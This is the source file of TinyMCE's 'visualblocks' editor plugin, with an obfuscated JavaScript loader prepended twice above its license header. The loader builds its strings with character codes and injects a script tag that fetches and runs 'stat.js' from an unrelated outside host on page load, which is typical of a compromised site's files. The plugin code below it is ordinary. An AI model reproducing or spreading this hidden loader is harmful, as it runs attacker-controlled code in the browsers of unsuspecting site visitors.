Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2012, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinymce.create('tinymce.plugins.VisualBlocks', {
		init : function(ed, url) {
			var cssId;

			// We don't support older browsers like IE6/7 and they don't provide prototypes for DOM objects
			if (!window.NodeList) {
				return;
			}

			ed.addCommand('mceVisualBlocks', function() {
				var dom = ed.dom, linkElm;

				if (!cssId) {
					cssId = dom.uniqueId();
					linkElm = dom.create('link', {
						id: cssId,
						rel : 'stylesheet',
						href : url + '/css/visualblocks.css'
					});

					ed.getDoc().getElementsByTagName('head')[0].appendChild(linkElm);
				} else {
					linkElm = dom.get(cssId);
					linkElm.disabled = !linkElm.disabled;
				}

				ed.controlManager.setActive('visualblocks', !linkElm.disabled);
			});

			ed.addButton('visualblocks', {title : 'visualblocks.desc', cmd : 'mceVisualBlocks'});

			ed.onInit.add(function() {
				if (ed.settings.visualblocks_default_state) {
					ed.execCommand('mceVisualBlocks', false, null, {skip_focus : true});
				}
			});
		},

		getInfo : function() {
			return {
				longname : 'Visual blocks',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/visualblocks',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('visualblocks', tinymce.plugins.VisualBlocks);
})();